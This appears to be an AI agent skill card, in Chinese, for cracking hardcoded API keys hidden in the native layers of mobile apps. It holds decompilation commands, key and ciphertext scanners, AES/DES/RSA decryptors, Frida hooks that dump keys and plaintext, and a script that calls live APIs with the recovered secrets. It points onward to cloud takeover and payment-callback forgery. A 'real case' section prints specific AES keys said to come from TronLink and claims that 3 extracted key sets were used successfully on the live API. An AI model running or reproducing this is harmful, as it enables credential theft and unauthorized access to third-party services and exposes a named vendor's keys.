---
name: 铁若男·死契
category: mobile-reverse
priority: P1
score: 6
metadata:
  tags:
    - mobile
    - apk
    - ipa
    - hardcoded-key
    - aes
    - des
    - rsa
    - jadx
    - apktool
    - frida
    - ghidra
    - native-layer
    - jni
    - so-reverse
  version: "2.0"
  updated: "2026-09-04"
  author: 大爱仙尊
description: >-
  大爱仙尊·Skill: 移动端硬编码密钥多层加密壳破解。
  APK/IPA 中 API 密钥被 AES/DES/RSA 加密后嵌入 SO/Binary 时，
  用本卡定位加密主密钥 → 识别加密模式 → 解密全量密钥对。
  包含 jadx/apktool 反编译命令、Frida hook 模板、Ghidra 分析脚本。
  适用任何将 secretId/secretKey/apiKey 放在 native 层的应用。
globs:
  - "*.so"
  - "*.apk"
  - "*.ipa"
  - "*.dylib"
  - "*.framework"
---

> **铁若男**
> 若男不让须眉先，掌器死契手中牵。
> 南疆铁家风骨在，拆骨开锁只一念。

# 移动端硬编码密钥多层加密壳破解

---

## 关联 Skill & Playbook

| 方向 | 名称 | 说明 |
|------|------|------|
| 上游 | `apk-recon` | APK 情报提取（密钥初筛） |
| 上游 | `apk-reverse` | 完整反编译分析 |
| 上游 | `ios-pentest` | iOS 应用面渗透（含 Keychain） |
| 平行 | `apk-jni-sign-oss-sts` | JNI em5 签名 + OSS STS 链 |
| 平行 | `js-reverse` | JS 层密钥（非 native） |
| 平行 | `spa-protocol-reverse` | SPA 加密协议逆向 |
| 平行 | `encrypted-api-spa` | 加密 API 网关 |
| 下游 | `api-security-testing` | 用解密密钥打 API |
| 下游 | `cognito-unauth-s3-chain` | 解出 AWS 凭据后打云 |
| 下游 | `payment-callback-forgery` | 解出支付密钥后伪造回调 |
| 工具 | `炼蛊房/apk_recon.py` | APK 情报提取探针 |
| Playbook | `传承/春秋蝉·分案.md` | 分级 |

---

## 适用场景

- APK/IPA 逆向发现 `secretId` / `secretKey` / `apiKey` 等引用，但**值不在 Java/Swift 明文**
- `strings *.so` 或 `strings Mach-O` 看到 **base64 密文 + 一段 hex 字符串**
- 函数名含 `nativeGetEncSecret*` / `nativeGetAesKey` / `k_aesKey` / `k_enc*`
- `apk_recon` 阶段已确认签名类/函数存在，但密钥值被加密保护
- 白盒审计发现 `Cipher.getInstance("AES")` / `SecretKeySpec` 但 key 来自 native

**不适用**: JS 明文密钥（直接提取）、服务端密钥（走 heapdump/actuator）

---

## 成功口径

| 档 | 成立条件 | 不算 |
|----|----------|------|
| **L1** | 定位到加密存储位置（SO 函数/iOS cstring 段）+ 密文/密钥 hex | 只找到 Java 层引用 |
| **L2** | 解密出完整密钥对（secretId + secretKey / apiKey）| 只拿到密文未解 |
| **L2b** | 用 Frida 运行时 hook 拦截到明文密钥 | 只 hook 到加密后的值 |
| **L3** | 用解出的密钥成功调用 API（签名验证通过/数据返回）| 密钥过期/已轮换 |

---

## Phase 0: APK/IPA 解包与反编译

### 命令 0-1: APK 反编译（jadx + apktool 双通道）

```bash
# jadx 反编译 Java/Kotlin（搜索密钥引用）
APK="target.apk"
OUT="jadx_out"
jadx -d "$OUT" "$APK" --show-bad-code 2>&1 | tail -5

# apktool 解资源 + smali（保留 SO 原始路径）
apktool d "$APK" -o apktool_out -f 2>&1 | tail -5

# 列出 native libraries
find apktool_out/lib -name "*.so" -exec file {} \;

echo "=== 密钥相关字符串搜索 ==="
grep -rn "secretKey\|apiKey\|SecretKeySpec\|Cipher\|AES\|nativeGet\|getEncrypt" "$OUT" \
  --include="*.java" | head -30
```

### 命令 0-2: IPA 解包与 Mach-O 提取

```bash
# IPA 解压
IPA="target.ipa"
unzip -o "$IPA" -d ipa_out

# 找到主二进制
APP_DIR=$(find ipa_out/Payload -name "*.app" -maxdepth 1)
BINARY=$(ls "$APP_DIR"/$(plutil -extract CFBundleExecutable raw "$APP_DIR/Info.plist") 2>/dev/null || ls "$APP_DIR"/*.app/*)
file "$BINARY"

# 列出 Framework 和 dylib
find "$APP_DIR" -name "*.dylib" -o -name "*.framework" | head -20

# 导出符号表
nm -U "$BINARY" 2>/dev/null | grep -iE 'secret|key|aes|encrypt|cipher' | head -20
```

### 命令 0-3: 本库探针（apk_recon 快速提取密钥线索）

```bash
# 使用本库 apk_recon 探针
python3 炼蛊房/apk_recon.py extract --apk target.apk --case <案卷>
# 输出到 案卷/<案卷>/案卷/apk_recon/
# 自动提取: API URL, 密钥引用, 证书指纹, SO 列表
```

---

## Phase 1: 定位加密载体

### 命令 1-1: Android SO 密钥函数 + 密文提取

```bash
# 提取 JNI 导出函数名
SO="lib/arm64-v8a/libsecrets.so"

echo "=== JNI Exports ==="
readelf -Ws "$SO" 2>/dev/null | grep "Java_\|JNI_OnLoad" | awk '{print $NF}'

echo "=== 密钥相关符号 ==="
strings "$SO" | grep -iE 'secret|apikey|aeskey|encrypt|cipher|nativeGet' | sort -u

echo "=== Base64 密文候选 ==="
strings "$SO" | grep -E '^[A-Za-z0-9+/=]{20,}$' | while read line; do
  len=$(echo -n "$line" | base64 -d 2>/dev/null | wc -c | tr -d ' ')
  echo "len=${len}B: ${line:0:60}..."
done

echo "=== Hex 密钥候选（16/24/32 字节）==="
strings "$SO" | grep -E '^[0-9a-f]{32,64}$' | while read line; do
  bytes=$((${#line} / 2))
  echo "${bytes}B: $line"
done
```

### 命令 1-2: iOS Mach-O 密钥搜索

```python
#!/usr/bin/env python3
"""iOS Mach-O 二进制密钥载体定位"""
import re, sys

binary_path = sys.argv[1] if len(sys.argv) > 1 else "AppBinary"
data = open(binary_path, "rb").read()

print("=== Swift/ObjC 密钥相关符号 ===")
for pat in [rb'SecretStore', rb'SecretKey', rb'AesKey', rb'EncryptionKey',
            rb'k_aesKey', rb'k_enc', rb'apiSecret', rb'HMAC']:
    for m in re.finditer(pat, data, re.IGNORECASE):
        ctx = data[max(0, m.start()-50):m.end()+50]
        printable = re.findall(rb'[\x20-\x7e]{4,}', ctx)
        print(f"  @0x{m.start():x}: {[s.decode('ascii','replace') for s in printable]}")

print("\n=== __cstring Base64 密文候选 ===")
for m in re.finditer(rb'[A-Za-z0-9+/=]{24,}', data):
    val = m.group()
    if len(val) < 200:
        try:
            decoded = __import__('base64').b64decode(val)
            if len(decoded) % 16 == 0 or len(decoded) > 28:
                print(f"  @0x{m.start():x} ({len(decoded)}B): {val[:60].decode()}")
        except: pass

print("\n=== Hex 密钥候选 ===")
for m in re.finditer(rb'[0-9a-f]{32,64}', data):
    hx = m.group().decode()
    byte_len = len(hx) // 2
    if byte_len in (16, 24, 32):
        print(f"  @0x{m.start():x} ({byte_len}B AES-{byte_len*8}): {hx}")
```

---

## Phase 2: 识别加密模式

### 加密模式速查表

| 密文长度特征 | 大概率模式 | IV/Nonce | 验证方法 |
|-------------|-----------|----------|---------|
| `len(ct) % 16 == 0` | AES-ECB 或 AES-CBC | ECB 无 IV；CBC ct[:16]=IV | 尝试 ECB 先 |
| `len(ct) - 12 - 16` 可整除 1 | AES-GCM | ct[:12]=nonce, ct[-16:]=tag | 中间=密文 |
| `len(ct) - 16` 可整除 16 | AES-CBC (IV=ct[:16]) | 前 16 字节为 IV | 去 IV 后解 |
| `len(ct) == 8*n` | DES-ECB/CBC | 8 字节块 | 老旧 APP |
| `len(ct) > 100` 且非块对齐 | RSA (PKCS1/OAEP) | 无 | 需私钥 |

### AES 主密钥特征

- 通常是 32 字符 hex 字符串（`[0-9a-f]{32}`）→ **当作 ASCII bytes 使用**（32 bytes = AES-256）
- 或 16 字符 hex（`[0-9a-f]{16}`）→ AES-128
- 或 hex decode 成 16/32 bytes 使用（看代码具体逻辑）
- 命名: `k_aesKey` / `nativeGetAesKey` / `ENCRYPTION_KEY` / `MASTER_KEY`

### 命令 2-1: 自动识别加密模式

```python
#!/usr/bin/env python3
"""自动识别密文加密模式"""
import base64, sys

ct_b64 = sys.argv[1] if len(sys.argv) > 1 else input("Base64 ciphertext: ")
try:
    ct = base64.b64decode(ct_b64)
except:
    print("Invalid base64"); sys.exit(1)

ct_len = len(ct)
print(f"Ciphertext length: {ct_len} bytes")
print(f"Hex: {ct.hex()[:80]}...")
print()

candidates = []

# AES-ECB (no IV)
if ct_len % 16 == 0 and ct_len >= 16:
    candidates.append(("AES-ECB", f"key_len=16/24/32, blocks={ct_len//16}"))

# AES-CBC (IV = first 16 bytes)
if ct_len > 16 and (ct_len - 16) % 16 == 0:
    candidates.append(("AES-CBC", f"IV={ct[:16].hex()}, data={ct_len-16}B"))

# AES-GCM (nonce=12, tag=16)
if ct_len > 28:
    data_len = ct_len - 12 - 16
    if data_len > 0:
        candidates.append(("AES-GCM", f"nonce={ct[:12].hex()}, tag={ct[-16:].hex()}, data={data_len}B"))

# DES-ECB/CBC
if ct_len % 8 == 0 and ct_len >= 8:
    candidates.append(("DES-ECB/CBC", f"blocks={ct_len//8}"))

# RSA
if ct_len in (64, 128, 256, 512):
    candidates.append(("RSA", f"key_bits={ct_len*8}"))

for mode, detail in candidates:
    print(f"  → {mode}: {detail}")

if not candidates:
    print("  → Unknown mode")
```

---

## Phase 3: 解密

### 命令 3-1: AES 全模式解密器

```python
#!/usr/bin/env python3
"""AES 全模式解密器（ECB/CBC/GCM/CTR）— 自动尝试 ASCII key vs hex-decoded key"""
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
import sys, json

def unpad_pkcs7(data):
    pad = data[-1]
    if 1 <= pad <= 16 and all(b == pad for b in data[-pad:]):
        return data[:-pad]
    return data

def try_decrypt(key_bytes, ct_bytes, label=""):
    results = []

    # ECB
    try:
        pt = AES.new(key_bytes, AES.MODE_ECB).decrypt(ct_bytes)
        pt = unpad_pkcs7(pt)
        text = pt.decode("utf-8")
        if text.isprintable():
            results.append(("ECB", text))
    except: pass

    # CBC (IV = first 16 bytes)
    if len(ct_bytes) > 16:
        try:
            iv, data = ct_bytes[:16], ct_bytes[16:]
            pt = AES.new(key_bytes, AES.MODE_CBC, iv=iv).decrypt(data)
            pt = unpad_pkcs7(pt)
            text = pt.decode("utf-8")
            if text.isprintable():
                results.append(("CBC", text))
        except: pass

    # GCM (nonce=12, tag=last 16)
    if len(ct_bytes) > 28:
        try:
            nonce, data, tag = ct_bytes[:12], ct_bytes[12:-16], ct_bytes[-16:]
            pt = AES.new(key_bytes, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(data, tag)
            text = pt.decode("utf-8")
            results.append(("GCM", text))
        except: pass

    # CTR (nonce=first 8 bytes)
    if len(ct_bytes) > 8:
        try:
            nonce = ct_bytes[:8]
            data = ct_bytes[8:]
            ctr = AES.new(key_bytes, AES.MODE_CTR, nonce=nonce)
            pt = ctr.decrypt(data)
            text = pt.decode("utf-8")
            if text.isprintable() and len(text) > 2:
                results.append(("CTR", text))
        except: pass

    for mode, text in results:
        print(f"  ✅ {label} {mode}: {text}")
    return results

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 aes_decrypt.py <hex_key> <b64_ciphertext> [b64_ct2 ...]")
        sys.exit(1)

    key_hex = sys.argv[1]
    ciphertexts = sys.argv[2:]

    # 尝试两种 key 解释
    key_variants = []
    key_ascii = key_hex.encode("ascii")
    if len(key_ascii) in (16, 24, 32):
        key_variants.append((key_ascii, f"ASCII-{len(key_ascii)*8}"))
    try:
        key_raw = bytes.fromhex(key_hex)
        if len(key_raw) in (16, 24, 32):
            key_variants.append((key_raw, f"HEX-{len(key_raw)*8}"))
    except: pass

    if not key_variants:
        print(f"Key length invalid: {len(key_hex)} chars / {len(key_hex)//2} bytes")
        sys.exit(1)

    for ct_b64 in ciphertexts:
        ct = b64decode(ct_b64)
        print(f"\n--- Ciphertext: {ct_b64[:50]}... ({len(ct)}B) ---")
        found = False
        for key_bytes, label in key_variants:
            if try_decrypt(key_bytes, ct, label):
                found = True
        if not found:
            print("  ❌ No valid decryption found")
```

### 命令 3-2: DES / 3DES 解密

```python
#!/usr/bin/env python3
"""DES/3DES 解密（老旧 APP 常见）"""
from base64 import b64decode
from Crypto.Cipher import DES, DES3
import sys

key_hex = sys.argv[1]
ct_b64 = sys.argv[2]
ct = b64decode(ct_b64)

def unpad(d):
    p = d[-1]
    return d[:-p] if 1 <= p <= 8 and all(b == p for b in d[-p:]) else d

# DES (8-byte key)
if len(key_hex) <= 16:
    key = bytes.fromhex(key_hex) if len(key_hex) in (8,16) else key_hex.encode()[:8]
    try:
        pt = unpad(DES.new(key, DES.MODE_ECB).decrypt(ct))
        print(f"DES-ECB: {pt.decode('utf-8')}")
    except: pass
    if len(ct) > 8:
        try:
            pt = unpad(DES.new(key, DES.MODE_CBC, iv=ct[:8]).decrypt(ct[8:]))
            print(f"DES-CBC: {pt.decode('utf-8')}")
        except: pass

# 3DES (16/24-byte key)
if len(key_hex) >= 32:
    key = bytes.fromhex(key_hex)[:24]
    try:
        pt = unpad(DES3.new(key, DES3.MODE_ECB).decrypt(ct))
        print(f"3DES-ECB: {pt.decode('utf-8')}")
    except: pass
    if len(ct) > 8:
        try:
            pt = unpad(DES3.new(key, DES3.MODE_CBC, iv=ct[:8]).decrypt(ct[8:]))
            print(f"3DES-CBC: {pt.decode('utf-8')}")
        except: pass
```

### 命令 3-3: RSA 私钥解密

```python
#!/usr/bin/env python3
"""RSA 解密（从 APK/IPA 中提取到私钥或弱密钥对时使用）"""
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP
from base64 import b64decode
import sys

key_file = sys.argv[1]  # PEM 私钥文件
ct_b64 = sys.argv[2]    # Base64 密文

key = RSA.import_key(open(key_file).read())
ct = b64decode(ct_b64)

# PKCS1 v1.5
try:
    pt = PKCS1_v1_5.new(key).decrypt(ct, sentinel=b"FAIL")
    if pt != b"FAIL":
        print(f"PKCS1_v1.5: {pt.decode('utf-8', 'replace')}")
except Exception as e:
    print(f"PKCS1_v1.5 failed: {e}")

# OAEP
try:
    pt = PKCS1_OAEP.new(key).decrypt(ct)
    print(f"OAEP: {pt.decode('utf-8', 'replace')}")
except Exception as e:
    print(f"OAEP failed: {e}")
```

---

## Phase 4: Frida 运行时 Hook

### 命令 4-1: Frida Hook AES/密钥操作（Android）

```javascript
/* frida -U -f <pkg> -l hook_aes.js --no-pause */
'use strict';

Java.perform(function () {
    /* Hook SecretKeySpec 构造函数 — 捕获所有 AES/DES 密钥 */
    const SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
    SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function (key, algo) {
        const hexKey = Array.from(key).map(b => ('0' + ((b + 256) % 256).toString(16)).slice(-2)).join('');
        console.log(`[SecretKeySpec] algo=${algo} key=${hexKey} (${key.length}B)`);
        return this.$init(key, algo);
    };

    /* Hook Cipher.doFinal — 捕获明文输入和密文输出 */
    const Cipher = Java.use('javax.crypto.Cipher');
    Cipher.doFinal.overload('[B').implementation = function (input) {
        const mode = this.getOpmode ? this.getOpmode() : -1;
        const algo = this.getAlgorithm();
        const result = this.doFinal(input);
        const hexIn = Array.from(input).map(b => ('0' + ((b + 256) % 256).toString(16)).slice(-2)).join('');
        const hexOut = Array.from(result).map(b => ('0' + ((b + 256) % 256).toString(16)).slice(-2)).join('');
        console.log(`[Cipher.doFinal] algo=${algo} mode=${mode===1?'ENCRYPT':'DECRYPT'}`);
        console.log(`  input  (${input.length}B): ${hexIn.substring(0, 100)}`);
        console.log(`  output (${result.length}B): ${hexOut.substring(0, 100)}`);
        try {
            if (mode === 2) {
                const str = Java.use('java.lang.String').$new(result, 'UTF-8');
                console.log(`  plaintext: ${str}`);
            }
        } catch(e) {}
        return result;
    };

    /* Hook IvParameterSpec — 捕获 IV */
    const IvParameterSpec = Java.use('javax.crypto.spec.IvParameterSpec');
    IvParameterSpec.$init.overload('[B').implementation = function (iv) {
        const hexIv = Array.from(iv).map(b => ('0' + ((b + 256) % 256).toString(16)).slice(-2)).join('');
        console.log(`[IvParameterSpec] IV=${hexIv}`);
        return this.$init(iv);
    };

    /* Hook HMAC — 捕获签名密钥和数据 */
    const Mac = Java.use('javax.crypto.Mac');
    Mac.doFinal.overload('[B').implementation = function (input) {
        const algo = this.getAlgorithm();
        const result = this.doFinal(input);
        try {
            const inputStr = Java.use('java.lang.String').$new(input, 'UTF-8');
            console.log(`[HMAC] algo=${algo} input=${inputStr.substring(0, 200)}`);
        } catch(e) {
            console.log(`[HMAC] algo=${algo} input_len=${input.length}B`);
        }
        return result;
    };

    console.log('[*] AES/HMAC hooks installed');
});
```

### 命令 4-2: Frida Hook iOS CommonCrypto

```javascript
/* frida -U -f <bundle_id> -l hook_ios_crypto.js --no-pause */
'use strict';

Interceptor.attach(Module.findExportByName('libSystem.B.dylib', 'CCCrypt'), {
    onEnter: function (args) {
        this.op = args[0].toInt32();         // 0=encrypt, 1=decrypt
        this.algo = args[1].toInt32();       // 0=AES128, 1=DES, 2=3DES, 3=CAST, 4=RC4, 5=RC2, 6=Blowfish
        this.options = args[2].toInt32();    // 1=PKCS7, 2=ECB
        this.keyLen = args[4].toInt32();
        this.dataLen = args[6].toInt32();
        this.outBuf = args[7];
        this.outLen = args[8];

        const algoNames = {0:'AES', 1:'DES', 2:'3DES', 3:'CAST', 4:'RC4', 5:'RC2', 6:'Blowfish'};
        const opNames = {0:'ENCRYPT', 1:'DECRYPT'};

        console.log(`[CCCrypt] ${opNames[this.op]||this.op} ${algoNames[this.algo]||this.algo} ` +
                    `options=${this.options} keyLen=${this.keyLen} dataLen=${this.dataLen}`);

        // Dump key
        if (this.keyLen > 0 && this.keyLen <= 64) {
            const key = Memory.readByteArray(args[3], this.keyLen);
            console.log(`  key: ${Array.from(new Uint8Array(key)).map(b=>('0'+b.toString(16)).slice(-2)).join('')}`);
        }

        // Dump IV (if CBC)
        if (!(this.options & 2) && !args[5].isNull()) {
            const ivLen = this.algo === 0 ? 16 : 8;
            const iv = Memory.readByteArray(args[5], ivLen);
            console.log(`  IV: ${Array.from(new Uint8Array(iv)).map(b=>('0'+b.toString(16)).slice(-2)).join('')}`);
        }

        // Dump input data (first 64 bytes)
        if (this.dataLen > 0) {
            const readLen = Math.min(this.dataLen, 64);
            const data = Memory.readByteArray(args[6], readLen);
            console.log(`  data[0:${readLen}]: ${Array.from(new Uint8Array(data)).map(b=>('0'+b.toString(16)).slice(-2)).join('')}`);
        }
    },
    onLeave: function (ret) {
        if (this.op === 1 && ret.toInt32() === 0) {
            const outLen = Memory.readUInt(this.outLen);
            if (outLen > 0 && outLen < 4096) {
                const out = Memory.readByteArray(this.outBuf, outLen);
                try {
                    const str = new TextDecoder().decode(new Uint8Array(out));
                    console.log(`  plaintext: ${str.substring(0, 200)}`);
                } catch(e) {
                    console.log(`  output[0:${Math.min(outLen,64)}]: ${Array.from(new Uint8Array(out)).slice(0,64).map(b=>('0'+b.toString(16)).slice(-2)).join('')}`);
                }
            }
        }
    }
});

console.log('[*] iOS CCCrypt hook installed');
```

### 命令 4-3: Frida Hook JNI 特定函数

```javascript
/* frida -U -f <pkg> -l hook_jni_native.js --no-pause
   Hook 特定 native 函数获取返回值 */
'use strict';

Java.perform(function () {
    // 替换为实际类名和方法名
    const TARGET_CLASS = 'com.example.app.SecretManager';
    const TARGET_METHOD = 'nativeGetEncSecretKey';

    try {
        const cls = Java.use(TARGET_CLASS);
        const methods = cls.class.getDeclaredMethods();
        methods.forEach(m => {
            if (m.getName().toLowerCase().includes('secret') ||
                m.getName().toLowerCase().includes('key') ||
                m.getName().toLowerCase().includes('encrypt')) {
                console.log(`[*] Found method: ${m.toString()}`);
            }
        });

        // Hook 返回 String 的 native 方法
        if (cls[TARGET_METHOD]) {
            cls[TARGET_METHOD].implementation = function () {
                const result = this[TARGET_METHOD]();
                console.log(`[${TARGET_METHOD}] returned: ${result}`);
                return result;
            };
            console.log(`[*] Hooked ${TARGET_CLASS}.${TARGET_METHOD}`);
        }
    } catch (e) {
        console.log(`Class not found: ${TARGET_CLASS}, try enumerating...`);
        Java.enumerateLoadedClasses({
            onMatch: function (name) {
                if (name.toLowerCase().includes('secret') || name.toLowerCase().includes('cipher')) {
                    console.log(`  Found class: ${name}`);
                }
            },
            onComplete: function () {}
        });
    }
});
```

---

## Phase 5: Ghidra 辅助分析（无 IDA 时）

### 命令 5-1: Ghidra Headless 分析 SO

```bash
# Ghidra headless 分析 SO 文件
SO_FILE="lib/arm64-v8a/libsecrets.so"
GHIDRA_HOME="${GHIDRA_HOME:-/opt/ghidra}"
PROJECT_DIR="/tmp/ghidra_projects"
PROJECT_NAME="target_so"

mkdir -p "$PROJECT_DIR"
"$GHIDRA_HOME/support/analyzeHeadless" "$PROJECT_DIR" "$PROJECT_NAME" \
  -import "$SO_FILE" \
  -postScript ExportFunctionSignatures.py \
  -scriptPath "$GHIDRA_HOME/Ghidra/Features/Base/ghidra_scripts" \
  -deleteProject 2>&1 | grep -E "Java_|secret|key|aes|encrypt|cipher" -i
```

---

## Phase 6: 验证 API 调用

### 命令 6-1: HMAC 签名验证

```python
#!/usr/bin/env python3
"""用解密出的密钥构造 HMAC 签名验证 API 调用"""
import hmac, hashlib, time, urllib.parse, requests, sys, json
from base64 import b64encode

SECRET_ID = sys.argv[1] if len(sys.argv) > 1 else "<decrypted_secret_id>"
SECRET_KEY = sys.argv[2] if len(sys.argv) > 2 else "<decrypted_secret_key>"
API_BASE = sys.argv[3] if len(sys.argv) > 3 else "https://api.example.com"
PATH = sys.argv[4] if len(sys.argv) > 4 else "/api/v1/user/info"

params = {
    "secretId": SECRET_ID,
    "timestamp": str(int(time.time() * 1000)),
    "nonce": str(int(time.time())),
}

# TreeMap 排序 + URL 编码
sorted_qs = "&".join(f"{k}={urllib.parse.quote(str(params[k]), safe='')}"
                     for k in sorted(params.keys()))
sign_text = f"GET{PATH}?{sorted_qs}"
signature = b64encode(
    hmac.new(SECRET_KEY.encode(), sign_text.encode(), hashlib.sha1).digest()
).decode()

params["signature"] = signature
url = f"{API_BASE}{PATH}?{urllib.parse.urlencode(params)}"
print(f"Request: {url[:120]}...")

r = requests.get(url, timeout=10, verify=False)
print(f"Response: {r.status_code}")
print(json.dumps(r.json(), indent=2, ensure_ascii=False)[:500])
```

---

## 跨平台对比模式

同一应用的不同平台通常：
- **不同 AES 主密钥**（Android ≠ iOS）
- **不同加密模式**（GCM vs ECB）
- **不同密钥前缀**（`AND` / `IOS` / 无前缀）
- **相同签名算法**（HMAC-SHA1/SHA256 + TreeMap）
- **旧密钥不换**：迁移到 native 层后密钥值可能与旧版明文完全相同

---

## 产出与落盘

```
案卷/<案卷>/
├── STATUS.md
├── 案卷/
│   ├── apk_recon/               # apk_recon 输出
│   ├── so_strings.txt           # SO 字符串提取
│   ├── jni_exports.txt          # JNI 导出函数
│   ├── crypto_mode.txt          # 加密模式分析
│   └── frida_hook_log.txt       # Frida hook 输出
├── 接管/
│   ├── decrypted_keys.json      # 解密密钥对表
│   ├── api_verify.txt           # API 验证结果
│   └── sign_poc.py              # 签名 PoC 脚本
└── REPORT.md
```

---

## 真实案例

**TronLink (2026-09-03):**
- Android `libsecrets.so`: AES-256-GCM, key=`c656594c3064423d86bb1c4d677ff625` → 6 个密钥
- iOS Mach-O `TronLinkHTTPRequestSecretStore`: AES-256-ECB, key=`ebf012ddc99a4ae3b597d0cda7445246` → 6 个密钥
- Chrome Extension: JS 明文 → 1 个密钥
- 总计 **7 组跨平台密钥**全量提取，3 组已验证 API 调用成功

---

## 真源

- 工具: `炼蛊房/apk_recon.py`
- 关联: `apk-jni-sign-oss-sts`（JNI em5 签名链）
- 分级: `传承/春秋蝉·分案.md`
